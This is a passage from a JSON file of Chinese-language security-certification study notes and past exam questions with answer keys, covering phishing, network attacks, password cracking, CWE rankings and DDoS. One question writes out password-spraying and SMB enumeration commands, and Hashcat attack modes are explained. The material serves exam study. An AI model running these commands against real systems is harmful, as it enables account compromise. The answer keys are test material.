   "summary": "社交工程題的情境是：員工被信件、電話或假網頁騙去點連結、交出帳密或執行附件。要先認得手法：釣魚（Phishing）是廣撒；魚叉式釣魚（Spear Phishing）針對特定個人或組織；鯨釣（Whaling）鎖定高階主管；複製型釣魚（Clone Phishing）複製先前收過的真實信件，替換連結或附件；語音釣魚（Vishing）用電話話術；憑證收集（Credential Harvesting）是偽造登入頁面騙取帳密。防護要組合：員工教育加演練、郵件閘道檢查惡意 URL 與附件、EDR 行為偵測、AI 輔助的郵件過濾；但「外部郵件一律隔離」過於極端，屬非必要。演練的目的是提升警覺與檢視行為，不是「反擊駭客」。",
   "keyPoints": [
    "看到「偽造登入頁面騙帳密」→ 憑證收集（Credential Harvesting）；植入 RAT、傾印硬碟是另一種攻擊階段。",
    "區分名稱：魚叉式＝針對特定個人／組織；鯨釣＝針對高階主管；複製型＝複製先前真實信件改連結或附件；Vishing＝語音話術，也可能與信件搭配。",
    "面對 AI 生成的多態惡意程式與自動化釣魚信 → 用行為式 EDR、AI 郵件過濾、意識培訓加演練；只靠每季更新的黑名單不夠。",
    "選「非必要」的防護 → 找出過度或不切實際者（如外部郵件一律隔離）；有效、可行的措施是教育演練、CDR 清洗、URL 檢查。",
    "社交工程演練的目的是檢視員工行為與提升警覺，並依結果加強教育，不是培養員工去反擊駭客。"
   ],
   "trap": "把魚叉式與鯨釣的定義對調，或以為演練是為了「反擊駭客」；以及認為只用黑名單就能擋 AI 時代的釣魚。",
   "quiz": [
    {
     "stem": "面對利用AI 技術生成多態（Polymorphic）惡意軟體和自動化釣魚郵件的攻擊，傳統的防禦方法已顯不足。為了有效對抗 AI 驅動的攻擊，企業應採取下列哪些防禦策略？",
     "options": [
      "部署基於行為分析的端點偵測與回應（Endpoint Detection and Response, EDR）系統",
      "實施強健的資安意識培訓，並結合釣魚郵件模擬演練",
      "採用AI 驅動的郵件過濾系統，以識別語氣和上下文的異常",
      "僅依賴每季更新一次的防火牆黑名單規則"
     ],
     "answer": [
      0,
      1,
      2
     ],
     "hint": "逐項問：面對樣態不斷變化的 AI 攻擊，這項防禦措施能不能持續有效？",
     "explanation": "答案 A、B、C。面對 AI 生成的多態惡意程式與自動化釣魚信，傳統特徵比對不足：A 行為分析式 EDR 能偵測異常行為；B 資安意識培訓搭配釣魚演練；C AI 驅動的郵件過濾能識別語氣與上下文異常。D 只靠每季更新一次的防火牆黑名單，更新速度趕不上變種與新網域，不足以防禦。",
     "source": "115-1 第16題"
    },
    {
     "stem": "釣魚攻擊中常見的「憑證收集（Credential Harvesting）」指的是下列何種做法？",
     "options": [
      "植入遠端存取木馬（Remote Access Trojan, RAT）",
      "對硬碟進行全碟資料傾印（Dumper）",
      "利用 CAPTCHA 阻擋分析",
      "偽裝成登入頁面，以騙取使用者的帳號與密碼"
     ],
     "answer": 3,
     "hint": "回想「憑證收集」在釣魚攻擊中的定義，逐項比對。",
     "explanation": "答案 D。憑證收集（Credential Harvesting）指偽裝成登入頁面，騙取使用者帳號與密碼。A 植入 RAT 是遠端控制木馬，屬後續植入階段；B 全碟傾印是資料備份或取證動作；C 利用 CAPTCHA 阻擋分析是釣魚頁面的反偵測手法，並非憑證收集本身。",
     "source": "114-2 第3題"
    },
    {
     "stem": "社交工程是利用人性弱點誘騙受害者透漏機敏性資料或是允許授權等行為，下列敘述何者錯誤？",
     "options": [
      "網路釣魚是最常見的社交工程的攻擊手法",
      "社交工程演練的目的是要培養員工反擊的能力，進而破壞駭客的攻擊手法",
      "駭客會利用偽造網站網址誘騙使用者上當也是屬於社交工程的攻擊手法之一",
      "企業組織會透過教育訓練宣導資安觀念，並委託廠商設計測試的釣魚郵件進行檢視員工點擊郵件與連結的行為是否違法資安規定"
     ],
     "answer": 1,
     "hint": "回想社交工程手法的種類，以及企業為什麼辦理這類演練，逐項判斷每句是否成立。",
     "explanation": "答案 B。社交工程演練的目的是提升員工警覺、檢視其點擊行為，並據以加強教育訓練，不是『培養反擊能力、破壞駭客手法』，所以 B 錯。A 網路釣魚確實是最常見的社交工程手法；C 偽造網站網址誘騙使用者屬社交工程；D 以教育訓練搭配釣魚信測試檢視員工行為是常見做法。",
     "source": "112-1 第10題"
    },
    {
     "stem": "國際勒索集團公司勒索 5000 萬美金，不然公開該公司機密資料。該勒索集團手法竟是透過公司郵件系統以釣魚郵件方式，讓內部員工執行惡意程式所造成，針對郵件安全防護的技術與手段，下列何項是「非必要」之措施？",
     "options": [
      "加強員工郵件安全的教育訓練，定期進行社交攻防演練",
      "採用 CDR 產品進行郵件清洗，並禁止執行檔下載，執行檔下載須依規定申請",
      "對外部郵件一律進行隔離",
      "檢查郵件內容中的惡意 URL 連結"
     ],
     "answer": 2,
     "context": "【題組2】\n駭客勒索集團入侵年收五百億上市公司，對其重要資料庫系統與研發系統破壞勒索加密，經過相關緊急應變後，費時近半個月才恢復公司正常運營，事後總經理召開檢討會議進行檢討。",
     "hint": "逐項判斷：這項郵件防護措施，對抗本案的釣魚手法是否必要、是否可行？",
     "explanation": "答案 C。針對郵件安全，A 員工教育訓練與定期演練、B 採用 CDR（內容解除與重建）清洗並管控執行檔下載、D 檢查郵件內容中的惡意 URL 連結，都是有效且常見的措施。C『對外部郵件一律隔離』過於極端，會嚴重影響正常業務，不是必要措施，故為『非必要』的選項。",
     "source": "112-1 第18題"
    },
    {
     "stem": "駭客勒索集團會利用網路釣魚方式，達成加密勒索目的，讓公司蒙受重大損失。身為公司資安人員，必須全面瞭解掌握各類駭客釣魚的方式，才能對公司高層提出有效防護對策。關於常見之駭客釣魚方式，下列敘述何者正確？",
     "options": [
      "鯨釣（Whaling）：針對特定人員、公司、組織的發送，目標為釣取特定人員機敏資料或於其電腦植入木馬",
      "魚叉式釣魚（Spear Phishing）：瞄準大型公司、重要人物發送特定釣魚郵件的攻擊",
      "複製型釣魚（Clone Phishing）：攻擊者使用某些方法密切監視受害者收件匣。攻擊者會收受害者近期電子郵件最好有連結或附件並進行複製偽造",
      "語音釣魚（Voice Phishing）：或稱 vishing會假冒為受害者信任的個人或單位，利用語音通話與各種話術，試圖從受害者取得各種機敏資訊，只限定在電話詐騙，不會使用在電子郵件中"
     ],
     "answer": 2,
     "hint": "逐項回想各種釣魚手法的定義（攻擊對象、管道、手法），判斷每句描述是否正確。",
     "explanation": "答案 C。複製型釣魚（Clone Phishing）是攻擊者複製先前收件匣中的真實信件，並替換連結或附件。A 的描述是魚叉式釣魚（針對特定人員、公司），而鯨釣是鎖定高階主管，兩者被對調；B 同理，把鯨釣的描述放在魚叉式上；D 語音釣魚（vishing）說『只限定在電話詐騙，不會使用在電子郵件中』太絕對，語音釣魚可與其他管道搭配。",
     "source": "111-1 第26題"
    }
   ]
  },
  {
   "id": "1.1-11",
   "section": "1.1",
   "title": "網路層與無線攻擊手法",
   "examHits": 5,
   "examRefs": [
    "115-1 第4題",
    "112-2 第3題",
    "111-1 第16題",
    "110-1 第3題",
    "109-1 第9題"
   ],
   "guidePages": "",
   "inGuide": true,
   "summary": "判斷一個攻擊能不能「遠端」打網路伺服器，要看攻擊要不要靠近目標。Slowloris（慢速 HTTP 攻擊）、Ping Flood、DDoS、SQL 注入都可以透過網路遠端發動；Evil Twin、Wi-Fi MITM、BlueBorne、Bluetooth 的簡易配對（Secure Simple Pairing）攻擊需要在無線電範圍內近接。OSI 層級也常考：Smurf、Ping of Death 是以 ICMP/IP 為主的網路層攻擊，DNS Poisoning 是應用層（DNS 協定），SYN Flood 才是傳輸層。STP 攻擊則是攻擊者讓自己的交換器成為根交換器（Root Bridge），再開啟流量鏡像取得全網流量。",
   "keyPoints": [
    "看到「能否遠端攻擊伺服器」→ 無線、藍牙類（Evil Twin、BlueBorne、簡易配對）需要近接；Slowloris、Ping Flood、DDoS、SQL 注入可遠端。",
    "看到 Smurf、Ping of Death → ICMP／IP，網路層；SYN Flood → 傳輸層（TCP）；DNS Poisoning → 應用層（DNS）。",
    "看到 STP 攻擊 → 攻擊者成為根交換器，常見後續是開啟流量鏡像把全網流量轉給自己。",
    "判斷層級的方法：先問這個攻擊動用的協定是 IP／ICMP、TCP／UDP，還是應用層協定。",
    "多選題要逐項判斷，不要只因為都是『攻擊手法』就一併選。"
   ],
   "trap": "把 ICMP 類攻擊（Smurf、Ping of Death）誤放進傳輸層，或把必須近接的無線／藍牙攻擊當成可遠端發動。",
   "quiz": [
    {
     "stem": "下列哪些攻擊手法可以透過遠端攻擊網路伺服器？",
     "options": [
      "Slowloris攻擊",
      "BlueBorne攻擊",
      "SQL指令注入（SQL Injection）",
      "Evil Twin攻擊"
     ],
     "answer": [
      0,
      2
     ],
     "hint": "逐項回想每種攻擊的運作方式，問：攻擊者需要位在哪裡才能發動？",
     "explanation": "答案 A、C。Slowloris 是慢速 HTTP 連線耗盡伺服器資源，可從遠端發動（A）；SQL 注入透過網路送出惡意查詢，可遠端攻擊（C）。B BlueBorne 是藍牙漏洞，需在藍牙通訊範圍內；D Evil Twin 是偽造同名無線基地台，需靠近目標範圍。",
     "source": "115-1 第4題"
    },
    {
     "stem": "下列哪些攻擊手法可以透過遠端攻擊網路伺服器？",
     "options": [
      "Ping Flooding",
      "DDoS",
      "簡單配對攻擊（Secure Simple Pairing Attacks）",
      "Wi-Fi MITM"
     ],
     "answer": [
      0,
      1
     ],
     "context": "現在你是一間企業的資安專責人員。最近，你發現一個未被掌握的內部系統漏洞，而且發現了來自不明來源的異常網路流量。你的任務是分析這個威脅，並提出適當的回應策略。",
     "hint": "逐項回想每種攻擊的運作方式，問：攻擊者需要位在哪裡才能發動？",
     "explanation": "答案 A、B。Ping Flooding 與 DDoS 都可從遠端經網路對伺服器發動。C 簡易配對攻擊（Secure Simple Pairing Attacks）是藍牙配對機制的攻擊，需要在藍牙範圍內；D Wi-Fi MITM 需處於同一無線網路或其範圍內。（原題附圖為文字截圖，內容為情境文字。）",
     "source": "112-2 第3題"
    },
    {
     "stem": "開放式系統互聯模型（Open System Interconnection Model, OSI）中，下列哪些「不」是在傳輸層（Transport Layer）的攻擊手法？",
     "options": [
      "Smurf Attack",
      "DNS Poisoning",
      "SYN Flood",
      "Ping of Death"
     ],
     "answer": [
      0,
      1,
      3
     ],
     "hint": "逐項回想每種攻擊利用的協定，再對照該協定所屬的 OSI 層。",
     "explanation": "答案 A、B、D。題目問『不』是傳輸層的攻擊：A Smurf 以 ICMP 廣播回應放大，屬網路層；B DNS Poisoning 是污染 DNS 解析結果，屬應用層；D Ping of Death 以超長 ICMP 封包攻擊，屬網路層。C SYN Flood 針對 TCP 三向交握，是傳輸層攻擊，所以不選。",
     "source": "111-1 第16題"
    },
    {
     "stem": "某駭客成功滲透進入公司的內部網路，藉由控制一台電腦發動生成樹協定（Spanning Tree Protocol, STP）控制攻擊，請問駭客接下來最有可能執行下列何項動作？",
     "options": [
      "在受欺騙的根交換器（Root Bridge）啟用鏡像流量，並轉送所有網路流量到受到控制的電腦",
      "在受欺騙的根交換器（Root Bridge）啟用開放式最短路徑優先（Open Shortest Path First, OSPF）協定",
      "對內部網路中的所有第二層交換器重複相同的攻擊",
      "重複相同的攻擊形成阻斷服務攻擊，癱瘓內部網路"
     ],
     "answer": 0,
     "hint": "回想 STP 攻擊讓攻擊者取得什麼地位，逐項判斷哪個後續動作最能發揮這個地位。",
     "explanation": "答案 A。生成樹協定（STP）攻擊是讓攻擊者的設備成為根交換器（Root Bridge），之後能在受欺騙的根交換器上啟用鏡像流量，把網路流量轉送到受控電腦，以便監看。B 啟用 OSPF 屬路由協定，與此攻擊流程無關；C 重複攻擊其他交換器與 D 形成阻斷服務，不是最可能的下一步。官方採 A。",
     "source": "109-1 第9題"
    }
   ]
  },
  {
   "id": "1.1-12",
   "section": "1.1",
   "title": "密碼攻擊與破解防護",
   "examHits": 4,
   "examRefs": [
    "114-1 第4題",
    "113-2 第26題",
    "113-1 第35題",
    "110-1 第16題"
   ],
   "guidePages": "",
   "inGuide": true,
   "summary": "密碼攻擊要分清楚型態。暴力破解（Brute-Force）是對單一帳號或雜湊猜大量密碼；密碼噴灑（Password Spraying）是拿少數常見密碼去試很多帳號，以避開帳號鎖定，日誌特徵是同一組密碼對多個不同使用者名稱；字典攻擊靠詞庫、可加規則；遮罩攻擊（Mask）依格式列舉。Hashcat 有字典（-a 0，可用 -r 載入規則）、組合（-a 1，兩個字典）、遮罩（-a 3）等模式。防護：密碼加鹽（Salt）、金鑰延伸（Key Stretching，如 PBKDF2）讓每次猜測更貴，加上密碼複雜度要求。單純雜湊（Hashing）不等於防暴力破解，因為雜湊本身很快。",
   "keyPoints": [
    "看到「同一組密碼搭配大量不同帳號」→ 密碼噴灑（Password Spraying）；一個帳號猜很多密碼才是暴力破解。",
    "看到 Hashcat 模式：-a 0＋-r＝字典加規則；-a 1＝組合兩個字典；Mask 的 ?u?l?d 是依字元類型逐位置組合，要對照範例順序。",
    "防暴力破解 → 金鑰延伸、加鹽、密碼複雜度；雜湊演算本身快、不能單獨防暴力破解。",
    "看紅隊指令判斷用途：--pass-pol／Get-ADDefaultDomainPasswordPolicy 是看密碼原則（找鎖定門檻）；用空帳密列舉共用資料夾是另一件事。",
    "判斷題目問『是』或『不是』某手法使用的指令，要先分清楚該手法的步驟。"
   ],
   "trap": "把噴灑與暴力破解的差別弄反；或認為「雜湊」就能防暴力破解。",
   "quiz": [
    {
     "stem": "關於知名密碼破解工具 Hashcat 的說明，下列哪些描述正確？",
     "options": [
      "可以破解的密碼種類超過 10 種",
      "可以使用 ?u?l?d?d?d?d?d?d 這種 Mask Attack Mode 來進行暴力破解，破解出來的密碼內容範例是 aB123456",
      "如果使用參數 -a 1 的話，可以同時使用兩個字典檔一起組合破解",
      "進行 -a 0 字典檔攻擊時，如果使用參數 -r 的話，可以載入一組規則以便進行 Rule-based Attack，例如在所有字典的後面加上 1234 組合成新的密碼"
     ],
     "answer": [
      0,
      2,
      3
     ],
     "hint": "逐項回想 Hashcat 的攻擊模式（-a）、遮罩字元與規則參數的定義，判斷每句是否成立。",
     "explanation": "答案 A、C、D。Hashcat 支援數百種雜湊類型，超過 10 種（A）；-a 1 是組合攻擊，能同時用兩個字典檔組合（C）；-a 0 搭配 -r 載入規則可做規則式攻擊，例如在字典詞後加 1234（D）。B 錯：?u?l?d?d?d?d?d?d 依序是大寫、小寫、6 個數字，產生的是像 Ab123456 的格式，aB123456（第一碼小寫、第二碼大寫）不符合。（官方公告：只答 C、D 也給分，官方未說明理由。）",
     "source": "114-1 第4題"
    },
    {
     "stem": "情境如附圖所示，於網站存取 Log 中出現了大量類似密碼的字元“1q2w#E$R”，而前面的欄位中出現了包含 admin, root, jason 等帳號型式的字元，依據這個 log 的內容，以 post 的 http 方法，向/bin_file/tmp/resver.php 傳送了上述的內容，且得到的狀態代碼回應為 200，這種類型的記錄應屬於下列何種攻擊手法？",
     "options": [
      "資料庫注入攻擊",
      "密碼噴撒攻擊",
      "跨站台請求偽造",
      "密碼暴力破解"
     ],
     "answer": 1,
     "context": "機房管理是安全營運中最為貼近實體安全的議題，在一次的實地查核中，發現有一網站伺服器主機上存有免殺（Anti Anti-Virus）Web shell，安裝於該主機的防毒軟體，並未即時的偵查到該惡意反向連接的 Web shell，資訊安全人員隨即啟動鑑識及調查，發現防火牆上的存取記錄中，每隔一周即有一次來自於外部的記錄，經過過濾 web shell 所在路徑，得到下面的幾個條列記錄，離現今已有半年以上：\nPost /bin_file/tmp/resver.php 200 13.137.38.56 admin 1q2w#E$R\nPost /bin_file/tmp/resver.php 200 112.54.117.233 admin1 1q2w#E$R\nPost /bin_file/tmp/resver.php 200 141.10.213.4 admin123 1q2w#E$R\nPost /bin_file/tmp/resver.php 200 141.10.213.4 user 1q2w#E$R\nPost /bin_file/tmp/resver.php 200 141.10.213.4 manager 1q2w#E$R\nPost /bin_file/tmp/resver.php 200 112.54.117.233 root 1q2w#E$R\nPost /bin_file/tmp/resver.php 200 13.137.38.56 sudo 1q2w#E$R\nPost /bin_file/tmp/resver.php 200 112.54.117.233 jason 1q2w#E$R\n\n詳細追查該檔案的建立日期為半年前，修改時間為 1 個月前，但在追查相關記錄時發現，外部防火牆上的時間校時為防火牆原廠提供的 NTP（Network Time Protocol），網站應用程式防火牆、外部防火牆及網站主機均有時間誤差。\n\n因公司所有終端電腦及伺服器均加入網域，為有效控制資安事件，鑑識人員追查網域控制站的安全性事件，發現有一管理人員的帳號密碼透過該網站伺服器向網域控制站進行登入，在過去這三個月來，每周均有一次透過網站伺服器主機上的員工入口網站主機登入驗證通過。\n\n同時發現該帳號於網站主機上，安全性事件記錄中，有大量的 4625 事件編號產生，且於網站伺服器的安全性事件中發現在約 2 個月前，已有大量人員的網域帳號因帳號鎖定，需要管理人員解鎖事件發生。\n\n更於上周有員工存放於網路共享磁碟上置放的資料，副檔名變成 encrypt123，CEO 認為這已影響到公司營運。",
     "hint": "觀察日誌中帳號與密碼欄位的變化模式，再逐項對照每種攻擊手法的特徵。",
     "explanation": "答案 B。日誌中同一組密碼 1q2w#E$R 對 admin、root、jason、sudo 等許多不同帳號都送出，是『一組密碼試許多帳號』的密碼噴灑特徵。A 資料庫注入的特徵是 SQL 語法；C 跨站請求偽造看的是使用者被誘導送出請求；D 暴力破解是對單一帳號猜許多密碼，與此日誌的模式不同。",
     "source": "113-2 第26題"
    },
    {
     "stem": "情境如附圖所示，紅隊進行內部滲透測試攻擊，下列哪一項「不」是針對 Password spray 會使用的手法？",
     "options": [
      "cme smb <dc-ip> -u user.txt -p password.txt –no-bruteforce",
      "Cme<IP> -U 'user' -p 'password' –pass-pol",
      "Get-ADDefaultDomainPasswordPolicy",
      "Smbmap -u '''' -p'''' -P 445 -H<dc-ip>"
     ],
     "answer": 3,
     "context": "某企業集團希望徵求紅隊演練測試，來驗證公司內部 IT 資安防護能力，可是又擔心執行過程中讓公司內部 IT 或資安部門無法獲得溝通學習成長，身為該公司重要外部資安顧問專家。",
     "hint": "回想 Password spray 的做法，逐項判斷每個指令的用途是否屬於這個手法。",
     "explanation": "答案 D。smbmap -u '' -p '' -P 445 -H <dc-ip> 是用空帳密列舉 SMB 共用，不是密碼噴灑的手法。A cme 以使用者清單與密碼清單搭配 --no-bruteforce 逐組嘗試，是噴灑；B 與 C 查詢網域密碼原則（--pass-pol、Get-ADDefaultDomainPasswordPolicy），是噴灑前確認鎖定門檻的準備動作。官方採 D。",
     "source": "113-1 第35題"
    },
    {
     "stem": "暴力破密（Brute-Force）攻擊是最需要大量運算資源的攻擊手法，下列哪些作法能有效避免暴力破密攻擊？",
     "options": [
      "密鑰延伸（Key stretching）",
      "密碼複雜度要求（Password Complexity Requirements）",
      "雜湊演算（Hashing）",
      "加鹽（Salting）"
     ],
     "answer": [
      0,
      1,
      3
     ],
     "hint": "逐項判斷：這個做法能不能讓暴力破密變得更困難？",
     "explanation": "答案 A、B、D。金鑰延伸（A）讓每次猜測成本變高；密碼複雜度要求（B）擴大搜尋空間；加鹽（D）讓預先計算的彩虹表失效並使每個密碼需單獨破解（官方採此看法）。C 雜湊演算只是把密碼轉成雜湊值，雜湊本身運算快，攻擊者仍可大量嘗試，單獨使用不能避免暴力破解。",
     "source": "110-1 第16題"
    }
   ]
  },
  {
   "id": "1.1-13",
   "section": "1.1",
   "title": "弱點類型與 CWE 分類",
   "examHits": 4,
   "examRefs": [
    "114-1 第2題",
    "114-1 第32題",
    "113-2 第4題",
    "112-1 第7題"
   ],
   "guidePages": "",
   "inGuide": true,
   "summary": "弱點（Vulnerability）是系統、程序、設計或內部控制上的缺陷，被利用才會造成衝擊；威脅（Threat）是可能利用弱點的事件或行為者。依來源可分軟體弱點（邏輯錯誤、未驗證輸入、設定配置錯誤）、硬體／韌體弱點、網路弱點（多餘的埠與服務、未加密協定）。零日弱點是廠商尚未提供修補（甚至未公開）的弱點，不是「已經有修補卻沒更新」。CWE Top 25 是最危險軟體弱點排行，2024 年版前五名為 CWE-79、CWE-787、CWE-89、CWE-352、CWE-22；2025 年版前五名改為 CWE-79、CWE-89、CWE-352、CWE-862（缺少授權）、CWE-787（題目寫明年份就照該年排名）。分辨情境是弱點還是威脅，常是 NIST SP 800-30 風格的題型。",
   "keyPoints": [
    "看到「已發布修補但沒更新」→ 是未修補的已知弱點，不是零日；零日是廠商尚未提供修補的弱點。",
    "分類：程式碼邏輯與輸入驗證、設定錯誤→軟體弱點；韌體、硬體記憶體處理→硬體弱點；多餘埠、未加密協定→網路弱點。",
    "NIST SP 800-30 的『弱點』是缺陷（如漏洞、預設密碼無法變更）；人員違規行為與勒索事件較接近威脅或事件，不是弱點本身。",
    "CWE Top 25 2024 前五名：CWE-79 XSS、CWE-787 越界寫入、CWE-89 SQL 注入、CWE-352 CSRF、CWE-22 路徑穿越；CWE-125 越界讀取第 6、CWE-416 Use After Free 第 8。2025 年版前五名為 79、89、352、862、787。",
    "問『哪類資產不會…弱點暴露』時，依官方答案作答；人員、資料、軟硬體在不同題目脈絡下判斷不同。"
   ],
   "trap": "把零日弱點與未修補的舊弱點混為一談；或把『人員違規造成的事件』當成弱點。",
   "quiz": [
    {
     "stem": "關於弱點攻擊的敘述，下列何者正確？",
     "options": [
      "軟體弱點或稱應用程式弱點，通常存在於軟體程式碼中，例如，錯誤的邏輯處理、未正確驗證輸入、設定配置錯誤造成危害等，都屬於這類的弱點",
      "硬體弱點：這些弱點存在於硬體設備或韌體中，例如，沒有正確處理記憶體的設置，而導致裝置超載當機，甚至資料外洩",
      "零日弱點：泛指廠商已經提供升級修補，卻沒進行升級更新的漏洞，攻擊者可以利用這些未被修補的弱點進行攻擊",
      "網路弱點：這種弱點可能因為網路設計、配置或安全政策的問題，例如，開放不必要的網路通訊埠或服務，或者沒有使用安全加密的通訊協定"
     ],
     "answer": [
      0,
      1,
      3
     ],
     "hint": "逐項回想弱點的分類定義（軟體、硬體、網路、零日），判斷每句的定義與例子是否相符。",
     "explanation": "答案 A、B、D。A 軟體弱點存在於程式碼，如錯誤邏輯、未驗證輸入、設定錯誤；B 硬體弱點存在於硬體或韌體，如記憶體設置不當導致當機或資料外洩；D 網路弱點來自設計、配置或政策，如開放不必要的埠、未用加密協定。C 把零日弱點說成『廠商已提供修補卻沒更新』是錯的，零日是廠商尚未修補（或尚未知悉）的弱點。",
     "source": "114-1 第2題"
    },
    {
     "stem": "漏洞是指因開發過程中不慎製造而導致安全性風險的弱點，依照 2024 SANS / CWE TOP 25 所指出的前 25 最危險的程式設計錯誤，下列那些是排名前五的項目？",
     "options": [
      "CWE-352 Cross-Site Request Forgery（CSRF）",
      "CWE-125 Out-of-bounds Read",
      "CWE-416 Use After Free",
      "CWE-787 Out-of-bounds Write"
     ],
     "answer": [
      0,
      3
     ],
     "hint": "回想 2024 年 CWE Top 25 的前五名，逐項判斷該 CWE 是否在其中。",
     "explanation": "答案 A、D。依 2024 CWE Top 25，前五名包含 CWE-787（越界寫入）與 CWE-352（CSRF）。CWE-125（越界讀取）與 CWE-416（Use After Free）排名在 5 名之後。（依 MITRE 公布資料：2024 年版 CWE-787 第 2、CWE-352 第 4、CWE-125 第 6、CWE-416 第 8。）",
     "source": "114-1 第32題"
    },
    {
     "stem": "情境如附圖所示，依據 NIST SP800 - 30 Guide for Conducting Risk Assessments 文件對於「弱點（Vulnerability）」之敘述係指「系統安全程序、設計、裝置、或內部控制的一個瑕疵或缺陷，若被利用後，會破壞安全性或違背系統安全政策」。請問關於「弱點」的敘述，下列何項錯誤？",
     "options": [
      "微軟發布之 Windows 作業系統漏洞",
      "系統管理人員依程序於每季末將離職人員之帳號停用",
      "IoT 設備無法變更預設密碼及帳號",
      "組織內部人員違反資安規定，私自攜帶外接式儲存設備並連接至組織內部重要伺服器使用，進而導致檔案伺服器遭受勒索病毒感染，重要資料遭受加密無法使用"
     ],
     "answer": 3,
     "context": "公司因供應鏈之客戶要求在執行受託業務時，必須針對所承接之受託業務有關的資訊安全有所作為，因此公司高層下令有關人員針對公司在執行受託業務上可能面臨的資訊安全風險議題進行研議。",
     "hint": "依題幹引用的 NIST SP 800-30 弱點定義，逐項判斷：這句描述是否符合「瑕疵或缺陷」的定義？",
     "explanation": "答案 D。依 NIST SP 800-30，弱點是系統安全程序、設計、裝置或內部控制的瑕疵或缺陷。A Windows 作業系統漏洞是弱點；C IoT 設備無法變更預設密碼與帳號是設計缺陷，也是弱點；B 每季末才停用離職人員帳號，使離職者帳號有一段空窗期，屬程序上的弱點。D 敘述的是內部人員違規攜帶外接儲存並導致勒索病毒感染的事件經過，屬威脅行為與事件結果，不是弱點本身，所以敘述錯誤。",
     "source": "113-2 第4題"
    },
    {
     "stem": "下列何種資產不會產生資訊系統安全弱點暴露的風險，被外界所利用攻擊？",
     "options": [
      "電腦硬體資產",
      "電腦軟體資產",
      "電腦資料資產",
      "人員資產"
     ],
     "answer": 3,
     "context": "【題組1】\n組織內部正在導入相關以技術來審查脆弱性補強的工具，包含作業系統弱點掃描、滲透測試、社交工程等，以下描述是針對這些工具實施之後，相關後續處理的議題。",
     "hint": "回想題組情境的審查工具與資產類別，逐項判斷；本題官方答案與一般認知不同，答完請看解析。",
     "explanation": "答案 D。官方採 D（人員資產不會產生資訊系統安全弱點暴露的風險）。一般多認為人員是社交工程等攻擊的弱環，這點與題目結論有出入，本題官方未說明理由，列為爭議題。A 電腦硬體資產、B 電腦軟體資產、C 電腦資料資產，題組情境將它們視為會暴露於弱點並被利用的資產。",
     "source": "112-1 第7題"
    }
   ]
  },
  {
   "id": "1.1-14",
   "section": "1.1",
   "title": "DoS／DDoS 攻擊判讀",
   "examHits": 3,
   "examRefs": [
    "114-2 第17題",
    "114-2 第18題",
    "112-2 第2題"
   ],
   "guidePages": "",
   "inGuide": true,
   "summary": "DoS／DDoS 的目的是讓服務無法使用（可用性）。判讀題通常給你封包側錄或連線數圖：很多不同來源 IP 在同一瞬間湧向同一目標的 Web 服務埠（TCP 443／80）、連線數圖在某時段急遽拉高，就是針對 Web 服務的 DDoS；細分的話，只送握手（SYN）不完成連線的是傳輸層的 SYN Flood，完成連線後送大量 HTTP 請求的是應用層的 HTTP Flood（114-2 第17題官方把這類情境歸為 HTTP Flood）；若是 UDP 53 大量查詢是 DNS Flood，大量 ICMP 是 ICMP Flood。DDoS 的破壞目的是癱瘓服務主機、影響網頁服務、塞爆頻寬，不包含「破壞程式」或「擷取封包資訊」這類屬於入侵或竊聽的目的。防禦常用流量清洗、CDN、專線擴充。市面上有買得到的 DDoS 服務，更增加偵查歸因難度。",
   "keyPoints": [
    "看到多個不同來源 IP、同一時刻、湧向目標同一服務埠（如 TCP 443）的大量封包，連線數圖急升 → 針對該服務的洪水攻擊；只有握手封包是 SYN Flood（傳輸層），送大量 HTTP 請求是 HTTP Flood（應用層），考題選項只有其中一種時選它。",
    "看協定與埠判斷洪水類型：UDP 53 大量查詢＝DNS Flood；ICMP 大量＝ICMP Flood；TCP 443/80 大量連線＝HTTP／SYN 類。",
    "DDoS 破壞目的 → 癱瘓主機、影響網頁服務、塞爆頻寬（皆是可用性）；擷取封包資訊是竊聽，破壞程式是入侵或惡意軟體。",
    "防禦方向：流量清洗、CDN、增加頻寬或專線；不是只靠單一設備。",
    "DDoS 與竊聽、資料外洩不同：它的成功指標是『服務不能用』。"
   ],
   "trap": "把 DDoS 的目的與竊聽封包、破壞程式混在一起；或只看有 SYN 就一律當成 SYN Flood，要連同埠、協定與選項一起判斷。",
   "quiz": [
    {
     "stem": "情境如附圖所示。某一天業務人員反應在公司外部無法連回公司展示伺服器進行 Demo，將 MIS 人員檢查，公司上網電路正常，由公司連外上網也正常，檢查主機連線記錄（如附圖二）及網路側錄資料（附圖三）。請問業務無法在外部展示期間，公司最可能遭受下列什麼類型的攻擊？",
     "options": [
      "跨站腳本攻擊（Cross Site Scripting）",
      "DNS 洪水攻擊（DNS Flood）",
      "HTTP 洪水攻擊（HTTP Flood）",
      "ICMP 洪水攻擊（ICMP Flood）"
     ],
     "answer": 2,
     "context": "ABC 新創公司於辦公室申請一路雙向 100Mbps 上網服務，並附 1 個固定 IP 位置，公司的連網架構如附圖一。\n以此固定 IP 在公司內部架設一台展示伺服器，提供業務人員於外部銷售時，可藉由此 IP 連線回公司進行功能展示與說明。\n附圖一、連網架構（示意圖：ABC 新創公司內有「展示伺服器」與「辦公室電腦」，經 Home Gateway、100/100M FTTB 連到 Internet，另一端為「業務展示」的行動裝置使用者）\n附圖二、主機連線記錄（折線圖：縱軸 Session，刻度 0～3M；橫軸時間 16:15 至 17:45，UTC+3。約 16:58 起連線數急遽上升，17:00 至 17:05 間高峰約 2.8M，之後降至約 1.8M，約 17:15 降回 0）\n附圖三、網路側錄資料（封包列表，欄位：No.、Time、Source、Destination、Protocol、Length、Info）\n共 21 筆，編號 1102123～1102143，時間皆為 20240312 17:15:29.85～29.87，來源為 21 個互不相同的外部 IP（例如 249.159.158.116、161.29.240.62、219.149.240.22、155.246.135.27、128.158.133.166、102.40.31.221、40.77.71.229、152.195.132.207、152.195.132.161、54.199.19.131、13.107.18.11、182.126.52.18、192.208.38.172、85.92.155.149、3.216.113.210、156.108.93.45、212.65.159.193、148.87.21.85、110.87.83.155、108.77.229.147、92.118.211.196），目的地皆為 104.71.211.xxx，Protocol 皆為 TCP，Length 皆為 66。\nInfo 欄皆為「443 → 5347x/5348x/5349x [SYN] Seq=0 Ack=1 Win=29200 Len=0」格式（來源埠 443，目的埠為遞增的 53476～53499）；其中第 1102133、1102138、1102143 筆為「[TCP Retransmission] 443 → … [SYN] Seq=0 Ack…」，第 1102133、1102137～1102141 筆列為灰底。",
     "hint": "從封包的協定、埠號與來源分布判斷是哪一種流量；再對照圖表中連線數何時突然變多。",
